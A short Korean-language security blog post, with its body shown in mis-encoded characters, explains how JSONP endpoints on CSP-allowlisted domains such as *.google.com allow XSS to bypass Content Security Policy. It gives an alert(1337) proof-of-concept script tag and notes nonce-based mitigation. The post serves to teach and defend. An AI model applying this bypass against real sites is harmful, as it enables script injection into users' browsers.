---
layout: post
title: JSONPë¥¼ í™œìš©í•œ XSS
subtitle: CSP ìš°íšŒì— ìì£¼ ì‚¬ìš©ë˜ëŠ” ê¸°ë²• ì¤‘ í•˜ë‚˜ì…ë‹ˆë‹¹
author: g3rm
categories: Web
banner:
  image: /assets/images/banners/home.gif
  opacity: 0.618
  background: "#000"
  heading_style: "font-size: 4.25em; font-weight: bold;"
  subheading_style: "color: gold"
tags:
  - XSS
  - JSONP
  - CSP
sidebar:
---
## Intro
JSONP(JSON with Padding)ëŠ” Same-Origin Policy ì¼ëª… SOP ì •ì±…ì„ ìš°íšŒí•˜ê¸° ìœ„í•´ ë‚˜ì˜¨ ê²ƒìœ¼ë¡œ ë‹¤ë¥¸ ë„ë©”ì¸ìœ¼ë¡œë¶€í„° ë°ì´í„°ë¥¼ ê°€ì ¸ì™€ì•¼ í•˜ëŠ” ìƒí™©ì´ ë§ì€ë°, ì´ëŸ´ ë•Œë§ˆë‹¤ cross-domain ì´ìŠˆê°€ ë°œìƒí•˜ì—¬ ì´ëŸ¬í•œ ë²ˆê±°ëŸ¬ì›€ì„ ì—†ì• ê¸° ìœ„í•´ ë‚˜ì˜¨ ë°©ë²•ì…ë‹ˆë‹¤.   

`<script>`íƒœê·¸ëŠ” src ì†ì„±ì— ëŒ€í•´ì„œ í•´ë‹¹ ìë°”ìŠ¤í¬ë¦½íŠ¸ë¥¼ í¬í•¨ì´ ì•„ë‹Œ ì‹¤í–‰ì‹œí‚¤ëŠ” íŠ¹ì§•ì„ ê°€ì§€ê³  ìˆìŠµë‹ˆë‹¤. ì´ ë•Œ, JSONP ìš”ì²­ìœ¼ë¡œ ì‘ë‹µì´ ì˜¨ Text íƒ€ì…ì„ `javascript`ë¡œ ì¸ì‹í•˜ì—¬ ë°”ë¡œ ì‹¤í–‰í•˜ê²Œ ë©ë‹ˆë‹¤.   
![](/assets/images/posts/2024-12-08-JSONP/c72fa8111c29a6205f52920526c6087f_MD5.jpeg)
## Detect & Exploit 
### Detect
ë³´í†µ CSP ì •ì±…ì„ ì„¤ì •í•  ë•Œ, google.com ë“±ê³¼ ê°™ì´ ë©”ì´ì € ë„ë©”ì¸ì„ ì‚¬ìš©í•˜ëŠ” ê²½ìš°ê°€ ë§ê³ , ê·¸ë ‡ê¸°ì— í—ˆìš©í•´ì£¼ëŠ” ê²½ìš°ë„ ë§ìŠµë‹ˆë‹¤. JSONPë¥¼ ì œê³µí•˜ëŠ” ë„ë©”ì¸ì´ CSP ì •ì±…ì—ì„œ í—ˆìš©ë˜ì–´ ìˆëŠ”ì§€ë§Œ í™•ì¸í•˜ë©´ ë©ë‹ˆë‹¤.   

```HTTP
[Response]
HTTP/2 200 OK
Content-Security-Policy: script-src *.google.com ~
```   
### Exploit
ê°€ì¥ í”í•œ googleì˜ oauth APIë¥¼ ì˜ˆì‹œë¡œ ì ê³  ë‚˜ë¨¸ì§€ëŠ” Referenceì— ì ì–´ë‘” í˜ì´ì§€ì—ì„œ ìƒí™©ì— ë§ê²Œ ì‚¬ìš©í•˜ì‹œë©´ ë˜ê² ìŠµë‹ˆë‹¤.ğŸ‘   
```javascript
<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1337)"></script>
```   

## Security Measures
ì™€ì¼ë“œì¹´ë“œë¡œ ì„¤ì •í•˜ëŠ” ê²ƒì„ ê°€ê¸‰ì  í”¼í•˜ê³ , nonce-{RANDOM_NONCE}

## References
[JSONP Payload](https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt)
